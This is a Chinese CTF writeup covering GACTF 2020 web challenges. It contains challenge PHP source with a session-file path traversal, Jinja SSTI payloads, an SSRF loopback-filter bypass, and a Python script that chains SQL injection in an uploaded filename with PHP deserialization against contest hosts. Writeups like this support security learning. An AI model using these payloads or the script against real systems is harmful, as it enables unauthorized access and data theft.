---
title: GACTF 2020 Web 部分题目 Writeup
date: 2020-09-01
tags: 
    - Writeup
    - CTF
---

## babyshop

上来一个小商城，懵了一圈以后扫了一下目录，发现有git泄露。源码脱下来以后发现进行了混淆。  
这个混淆有意思啊，所有的变量名甚至都是有意义的，难不成是出题人人 工 混 淆？  

简单浏览以后通过经验可以判断出，整个`init.php`大体分为两部分，`造化之神`用于混淆字符串常量，而`造化`函数则用于获取原字符串，是很常用的字符串常量混淆手段。再加上php的字符串可以作为函数调用，函数名也可以利用这种方式进行混淆。比如`造化("拢监纪浑诊余仍逃抹哀天夫")`实际上就是`stripos`  
于是我们可以写一个简单的小脚本进行字符串恢复，抛弃`造化`部分。脚本由于没有复用价值，就不放在这了。`测`，`获`，`赋`等工具函数也可以通过简单的正则匹配进行替换。

最终我们可以恢复出混淆前的代码：

{% spoiler 题目源码 %}

```php
<?php
ini_set('display_errors', 'Off');
class 造齿轮
{
    protected $朝拜圣地;
    protected $贡品;
    protected $圣殿;
    protected $禁地;
    public function __construct()
    {
        $this->朝拜圣地 = 'storage';
        if (!is_dir($this->朝拜圣地)) mkdir($this->朝拜圣地);
        $this->禁地 = array('php', 'html', 'htaccess');
    }
    public function 挖掘($货物, $食物)
    {
        foreach ($this->禁地 as $元素) {
            if (stripos($_COOKIE[$食物], $元素) !== false) {
                die('invaild ' . $食物);
                return false;
            }
        }
        $this->圣殿 = session_id();
        return true;
    }
    public function 种植($货物, $食物)
    {
        $this->贡品 = $货物;
        return file_put_contents($this->朝拜圣地 . '/sess_' . $货物, $食物) === false ? false : true;
    }
    public function 收获($货物)
    {
        $this->贡品 = $货物;
        return (string)@file_get_contents($this->朝拜圣地 . '/sess_' . $货物);
    }
    public function 总结($货物)
    {
        if (strlen($this->圣殿) <= 0) return;
        return file_put_contents($this->朝拜圣地 . '/note_' . $this->圣殿, $货物) === false ? false : true;
    }
    public function 归纳()
    {
        return (string)@file_get_contents($this->朝拜圣地 . '/note_' . $this->贡品);
    }
    public function 思考($货物)
    {
        $this->贡品 = $货物;
        if (file_exists($this->朝拜圣地 . '/sess_' . $货物)) {
            unlink($this->朝拜圣地 . '/sess_' . $货物);
        }
        return true;
    }
    public function 反省($货物)
    {
        foreach (glob($this->朝拜圣地 . '/*') as $元素) {
            if (filemtime($元素) + $货物 < time() && file_exists($元素)) {
                unlink($元素);
            }
        }
        return true;
    }
    public function 完毕()
    {
        return true;
    }
    public function __destruct()
    {
        $this->总结($this->归纳());
    }
}
$齿轮 = new 造齿轮();
session_set_save_handler(array($齿轮, '挖掘'), array($齿轮, '完毕'), array($齿轮, '收获'), array($齿轮, '种植'), array($齿轮, '反省'), array($齿轮, '完毕'));
session_start();
srand(mktime(0, 0, 0, 0, 0, 0));
$盛世 = array(rand() => array('alice', 1), rand() => array('bob', 5), rand() => array('cat', 20), rand() => array('dog', 15), rand() => array('evil', 5), rand() => array('flag', 9999));
function 化缘()
{
    return $_SESSION['balance'];
}
function 取经()
{
    global $盛世;
    $宝藏 = '[';
    foreach ($_SESSION['items'] as $元素) $宝藏 .= $盛世[$元素][0] . ', ';
    $宝藏 .= ']';
    return $宝藏;
}
function 念经()
{
    global $齿轮;
    return $齿轮->归纳();
}
function 造世()
{
    global $盛世;
    $宝藏 = '';
    foreach ($盛世 as $按键 => $元素) $宝藏 .= '<div class="item"><form method="POST"><div class="form-group">' . $元素[0] . '</div><div class="form-group"><input type="hidden" name="id" value="' . $按键 . '"><button type="submit" class="btn btn-success">buy ($' . $元素[1] . ')</button></div></form></div>';
    return $宝藏;
}
if (!isset($_SESSION['balance'])) $_SESSION['balance'] = 2233;
if (!isset($_SESSION['items'])) $_SESSION['items'] = [];
if (!isset($_SESSION['note'])) $_SESSION['note'] = '';
if (isset($_POST['id'])) {
    if ($_SESSION['balance'] >= $盛世[$_POST['id']][1]) {
        $_SESSION['balance'] = $_SESSION['balance'] - $盛世[$_POST['id']][1];
        array_push(${'_SESSION'}['items'], $_POST['id']);
        echo ('<span style="color:green">buy succ!</span>');
    } else {
        echo ('<span style="color:red">lack of balance!</span>');
    }
}
if (isset($_POST['note'])) {
    if (strlen($_POST['note']) <= 1 << 10) {
        $齿轮->总结(str_replace(array('&', '<', '>'), array('&amp;', '&lt;', '&gt;'), $_POST['note']));
        echo ('<span style="color:green">write succ!</span>');
    } else {
        echo ('<span style="color:red">note too long!</span>');
    }
}
```

{% endspoiler %}

阅读源码我们可以看出，出题人自行注册了session数据存储机制，将session数据存储在了web目录下，文件名后半部分可控。
参考php `session_set_save_handler`函数手册，结合源码，我们可以发现源码对sessionid进行了简单过滤。

如何解这道题呢？

### 最简单的解法

首先我们可以看到Accounts页面中回显了`note_`文件的内容，我们能够控制这个文件的路径，而这里存在目录穿越
所以我们把sessionid设置成`../../../../flag`就行了。flag文件我们没权限写，读权限还是有的。我们是这么做出来的（（

### 出题人可能预期的解法

虽然题已经做出来了，但是后面貌似出题人将flag加入了关键词检测。看一看源码，有两个有趣的地方

* `srand(固定值)`
* session处理的逻辑写在了一个类里面，有`__destruct`，且反序列化可以绕过对sessionid的waf

具体怎么做还没来得及研究，之后有空了再说吧

## EZFLASK

出题人给出了部分源码，明摆着就是想让我们去访问admin路由。
[__globals__到底是什么](https://docs.python.org/3/reference/datamodel.html?highlight=__globals__)

`{{index.__globals__}}`

{% asset_img upload_e92ae998edaadf1d01a758abe82e4d47.png aaa %}

于是我们可以看出admin路由为`/h4rdt0f1nd_9792uagcaca00qjaf`，访问后发现是一个requests的ssrf点。  
还有一个ctf函数我们还没有用过，看出题人的意思是那里有一些提示。通过[__code__属性](https://docs.python.org/3/reference/datamodel.html?highlight=__code__)我们可以一窥ctf函数中的常量：

```python
{{ctf.__code__.co_consts}}:
可知：

hint = 'the admin route :h4rdt0f1nd_9792uagcaca00qjaf<!-- port : 5000 -->'
trick = 'too young too simple'
```

提示说5000端口有另一个服务。但是当我们尝试访问`127.0.0.1`时发现有waf。梅开二度，我们可以通过`__code__`来大体看到waf规则：

{% asset_img upload_f4abe482d6ed5160ea58f93868f0cce4.png Result %}

0.0被过滤了。冷知识时间：本地回环地址为`127.0.0.0/8`，这个掩码`8`是不是看起来不太直观？我们换个样子试试：`255.0.0.0`。

所以访问`127.114.51.4:5000`，看到内层的应用是一个裸的ssti，flag在app.config里。然而ssrf的path在外层进行了过滤(`waf_path`)。很可惜，`waf_path.__code__.co_consts`由于长度问题被过滤了，过滤规则只能通过盲猜。

经过一系列尝试，在`url_for.__globals__.current_app`找到了app对象。

## carefuleyes

整体上就是Hitcon 2016 babytrick梅开二度，随便找一个注入点就行了

rename.php中有一个自注入，很刻意

我 注 我 自 己

```python
from requests import session
from phpserialize import *


ses = session()
# host = 'http://124.71.191.175'
host = 'http://202.182.118.236'
# host = 'http://localhost'

file = 'frankli\' and 1=0 union select 1,`password` as filename,3,4,5 from user where username=\'XM\' #.txt'
ses.post(host + '/upload.php', files={
    'upfile': (file, 'b')
}).text
passwd = ses.get(host + '/rename.php', params={
    'oldname': file[:-4],
    'newname': 'asdf'
}).text
passwd = passwd[14:passwd.find('will be changed') - 1]


class XCTFGG:
    private_method = 'login'
    private_args = ['XM', passwd]


print(ses.post(host + '/upload.php', files={
    'upfile': ('frank.txt', 'c')
}, params={
    'data': serialize(XCTFGG())
}).text)
```

## simple flask 与 XWiki

略。simple flask抢了个一血，挺开心的（
